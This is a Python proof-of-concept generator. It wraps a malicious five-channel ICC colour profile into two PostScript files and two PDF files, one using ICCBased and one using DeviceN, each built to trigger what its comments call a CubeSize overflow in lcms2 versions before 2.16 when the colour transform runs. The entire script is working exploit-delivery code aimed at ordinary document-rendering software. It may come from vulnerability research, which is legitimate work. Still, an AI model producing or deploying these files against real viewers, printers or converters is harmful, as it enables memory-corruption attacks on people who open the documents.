#!/usr/bin/env python3
"""
Generator for PostScript and PDF POC files using malicious 5-channel ICC profile.
"""
import struct
import zlib
import os

ICC_PATH = '/home/ubuntu/mal_5ch.icc'

with open(ICC_PATH, 'rb') as f:
    icc_data = f.read()

icc_hex = icc_data.hex().upper()
icc_compressed = zlib.compress(icc_data, 9)
icc_len = len(icc_data)
icc_compressed_len = len(icc_compressed)

print(f'ICC profile: {icc_len} bytes raw, {icc_compressed_len} bytes compressed')

# =========================================================
# Step 1: PostScript POC
# =========================================================
# PostScript ICCBased color space:
# [ /ICCBased dict ] where dict has /N and /DataSource

ps_content = f"""%!PS-Adobe-3.0
%%Title: lcms2 5-channel ICCBased overflow POC
%%EndComments

% Load a 5-channel ICC profile inline via ASCII hex
% N=5 triggers the CubeSize overflow in lcms2 < 2.16

% Build the ICCBased color space dictionary
/icc_stream_dict
  << /N 5
     /Alternate /DeviceCMYK
  >>
def

% Use a string-based data source approach
% The ICC data is embedded as hex string
/mal_icc_hex ({icc_hex}) def
/mal_icc_data mal_icc_hex length 2 idiv string def
0 1 mal_icc_data length 1 sub {{
  /i exch def
  mal_icc_data i
    mal_icc_hex i 2 mul 2 getinterval
    16 strtoint
  put
}} for

% Create a ByteArray data source
/DataSource mal_icc_data def

% Set the ICCBased color space
[ /ICCBased
  << /N 5
     /Alternate /DeviceCMYK
     /DataSource mal_icc_data
  >>
] setcolorspace

% Fill with 5-component color (triggers transform)
0.5 0.5 0.5 0.5 0.5 setcolor
0 0 72 72 rectfill

showpage
"""

with open('/home/ubuntu/poc_5ch.ps', 'w') as f:
    f.write(ps_content)
print('Written: /home/ubuntu/poc_5ch.ps')

# =========================================================
# Step 2: Simpler PS using currentfile + ASCIIHexDecode
# =========================================================

ps2_header = """%!PS-Adobe-3.0
%%Title: lcms2 5-channel ICCBased overflow POC v2 (currentfile)
%%EndComments

% This approach uses currentfile to stream the ICC profile
% The ASCIIHexDecode filter reads hex data inline in the PS stream

"""

ps2_colorspace = """[ /ICCBased
  << /N 5
     /Alternate /DeviceCMYK
     /DataSource currentfile /ASCIIHexDecode filter
  >>
] setcolorspace
"""

ps2_footer = """
% Render a small fill to trigger the color transform
0.5 0.5 0.5 0.5 0.5 setcolor
0 0 72 72 rectfill

showpage
"""

# Format hex data in 80-char lines
hex_lines = []
hex_str = icc_hex
for i in range(0, len(hex_str), 80):
    hex_lines.append(hex_str[i:i+80])
hex_data = '\n'.join(hex_lines) + '\n>\n'

ps2_content = ps2_header + ps2_colorspace + hex_data + ps2_footer

with open('/home/ubuntu/poc_5ch_v2.ps', 'w') as f:
    f.write(ps2_content)
print('Written: /home/ubuntu/poc_5ch_v2.ps')

# =========================================================
# Step 3: PDF with /ICCBased N=5 on 1x1 image XObject
# =========================================================

# Build PDF objects
objects = {}

# Object 1: Catalog
objects[1] = b'<< /Type /Catalog /Pages 2 0 R >>'

# Object 2: Pages
objects[2] = b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>'

# Object 3: Page
objects[3] = (
    b'<< /Type /Page /Parent 2 0 R '
    b'/MediaBox [0 0 72 72] '
    b'/Resources << /ColorSpace << /CS1 [/ICCBased 5 0 R] >> '
    b'                /XObject << /Im1 6 0 R >> >> '
    b'/Contents 4 0 R >>'
)

# Object 4: Page content stream
page_content = b'q 72 0 0 72 0 0 cm /Im1 Do Q'
objects[4] = b'<< /Length ' + str(len(page_content)).encode() + b' >>\nstream\n' + page_content + b'\nendstream'

# Object 5: ICCBased color space dict (5 channels, references profile stream at obj 7)
objects[5] = (
    b'<< /N 5 /Alternate /DeviceCMYK '
    b'/Length ' + str(icc_compressed_len).encode() + b' '
    b'/Filter /FlateDecode >>\n'
    b'stream\n' + icc_compressed + b'\nendstream'
)

# Object 6: Image XObject - 1x1 pixel, 5 channels
# 5 bytes of pixel data (one pixel, 5 channels, 8-bit each)
pixel_data = bytes([128, 128, 128, 128, 128])  # 50% in each channel
pixel_compressed = zlib.compress(pixel_data, 9)
objects[6] = (
    b'<< /Type /XObject /Subtype /Image '
    b'/Width 1 /Height 1 '
    b'/ColorSpace [/ICCBased 5 0 R] '
    b'/BitsPerComponent 8 '
    b'/Filter /FlateDecode '
    b'/Length ' + str(len(pixel_compressed)).encode() + b' >>\n'
    b'stream\n' + pixel_compressed + b'\nendstream'
)

# Build PDF
pdf_parts = [b'%PDF-1.4\n%\xe2\xe3\xcf\xd3\n']
offsets = {}

for obj_num in sorted(objects.keys()):
    offsets[obj_num] = len(b''.join(pdf_parts))
    obj_data = objects[obj_num]
    pdf_parts.append(str(obj_num).encode() + b' 0 obj\n' + obj_data + b'\nendobj\n')

# Cross-reference table
xref_offset = len(b''.join(pdf_parts))
xref = b'xref\n0 ' + str(len(objects) + 1).encode() + b'\n'
xref += b'0000000000 65535 f \n'
for obj_num in sorted(objects.keys()):
    xref += str(offsets[obj_num]).encode().zfill(10) + b' 00000 n \n'

trailer = (
    b'trailer\n<< /Size ' + str(len(objects) + 1).encode() + b' /Root 1 0 R >>\n'
    b'startxref\n' + str(xref_offset).encode() + b'\n%%EOF\n'
)

pdf_parts.append(xref)
pdf_parts.append(trailer)

pdf_data = b''.join(pdf_parts)

with open('/home/ubuntu/poc_iccbased_5ch.pdf', 'wb') as f:
    f.write(pdf_data)
print(f'Written: /home/ubuntu/poc_iccbased_5ch.pdf ({len(pdf_data)} bytes)')

# =========================================================
# Step 4: PDF with /DeviceN 5-channel + ICCBased alternate
# =========================================================

objects_dn = {}

# Object 1: Catalog
objects_dn[1] = b'<< /Type /Catalog /Pages 2 0 R >>'

# Object 2: Pages
objects_dn[2] = b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>'

# Object 3: Page with DeviceN color space
objects_dn[3] = (
    b'<< /Type /Page /Parent 2 0 R '
    b'/MediaBox [0 0 72 72] '
    b'/Resources << /ColorSpace << /CS1 8 0 R >> '
    b'                /XObject << /Im1 6 0 R >> >> '
    b'/Contents 4 0 R >>'
)

# Object 4: Content
page_content_dn = b'/CS1 cs 0.5 0.5 0.5 0.5 0.5 sc 0 0 72 72 re f'
objects_dn[4] = b'<< /Length ' + str(len(page_content_dn)).encode() + b' >>\nstream\n' + page_content_dn + b'\nendstream'

# Object 5: ICC profile stream (the malicious 5-channel profile)
objects_dn[5] = (
    b'<< /N 5 /Alternate /DeviceCMYK '
    b'/Length ' + str(icc_compressed_len).encode() + b' '
    b'/Filter /FlateDecode >>\n'
    b'stream\n' + icc_compressed + b'\nendstream'
)

# Object 6: 1x1 image with DeviceN color space
pixel_data_dn = bytes([128, 128, 128, 128, 128])
pixel_compressed_dn = zlib.compress(pixel_data_dn, 9)
objects_dn[6] = (
    b'<< /Type /XObject /Subtype /Image '
    b'/Width 1 /Height 1 '
    b'/ColorSpace 8 0 R '
    b'/BitsPerComponent 8 '
    b'/Filter /FlateDecode '
    b'/Length ' + str(len(pixel_compressed_dn)).encode() + b' >>\n'
    b'stream\n' + pixel_compressed_dn + b'\nendstream'
)

# Object 7: Identity tint transform function (5 -> 3 RGB)
# FunctionType 4 (PostScript calculator), Domain [0 1] x5, Range [0 1] x3
tint_func = b'{ pop pop pop pop }' # Takes 5 args, returns 3 (simple: discard 2, keep 3... actually needs 3 outputs)
# Better: identity for first 3 channels
tint_func = b'{ 5 1 roll pop pop }'  # pops last 2, leaves top 3
tint_func_stream = tint_func
objects_dn[7] = (
    b'<< /FunctionType 4 '
    b'/Domain [0 1 0 1 0 1 0 1 0 1] '
    b'/Range [0 1 0 1 0 1] '
    b'/Length ' + str(len(tint_func_stream)).encode() + b' >>\n'
    b'stream\n' + tint_func_stream + b'\nendstream'
)

# Object 8: DeviceN color space array
# [/DeviceN names alternateSpace tintTransform attributes]
# Process dict in attributes links to ICCBased profile
objects_dn[8] = (
    b'[ /DeviceN '
    b'[/C1 /C2 /C3 /C4 /C5] '
    b'/DeviceRGB '
    b'7 0 R '
    b'<< /Subtype /NChannel '
    b'   /Process << /ColorSpace [/ICCBased 5 0 R] '
    b'               /Components [/C1 /C2 /C3 /C4 /C5] >> '
    b'>> ]'
)

# Build PDF
pdf_parts_dn = [b'%PDF-1.4\n%\xe2\xe3\xcf\xd3\n']
offsets_dn = {}

for obj_num in sorted(objects_dn.keys()):
    offsets_dn[obj_num] = len(b''.join(pdf_parts_dn))
    obj_data = objects_dn[obj_num]
    pdf_parts_dn.append(str(obj_num).encode() + b' 0 obj\n' + obj_data + b'\nendobj\n')

xref_offset_dn = len(b''.join(pdf_parts_dn))
xref_dn = b'xref\n0 ' + str(len(objects_dn) + 1).encode() + b'\n'
xref_dn += b'0000000000 65535 f \n'
for obj_num in sorted(objects_dn.keys()):
    xref_dn += str(offsets_dn[obj_num]).encode().zfill(10) + b' 00000 n \n'

trailer_dn = (
    b'trailer\n<< /Size ' + str(len(objects_dn) + 1).encode() + b' /Root 1 0 R >>\n'
    b'startxref\n' + str(xref_offset_dn).encode() + b'\n%%EOF\n'
)

pdf_parts_dn.append(xref_dn)
pdf_parts_dn.append(trailer_dn)

pdf_data_dn = b''.join(pdf_parts_dn)

with open('/home/ubuntu/poc_devicen_5ch.pdf', 'wb') as f:
    f.write(pdf_data_dn)
print(f'Written: /home/ubuntu/poc_devicen_5ch.pdf ({len(pdf_data_dn)} bytes)')

print('\nAll POC files generated successfully.')
